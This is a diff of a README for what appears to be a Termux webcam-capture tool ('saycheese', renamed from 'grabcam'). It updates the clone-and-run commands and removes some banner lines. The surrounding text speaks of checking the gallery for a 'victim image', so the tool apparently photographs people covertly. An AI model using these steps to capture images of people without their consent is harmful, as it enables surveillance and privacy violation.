@@ -32,11 +32,8 @@
 * `pkg install git -y`
 * `pip install lolcat`
 * `git clone https://github.com/MnM63/saycheese.git`
-* `cd $HOME`
-* `ls`
-* `cd grabcam`
-* `ls`
-* `bash grabcam.sh`
+* `cd saycheese`
+* `bash saycheese.sh`
 ```
 to see captured images >>>
 ```
@@ -48,11 +45,4 @@ mv (image name with .png) /sdcard
 ```
 Now go and chek your gallery for victim image...
 ```
-```
-[+]--Now you need internet connection to continue further process...
-
-[+]--You can select any option by clicking on your keyboard
-
-[+]--Note:- Don't delete any of the scripts included in grabcam files
-
 ```
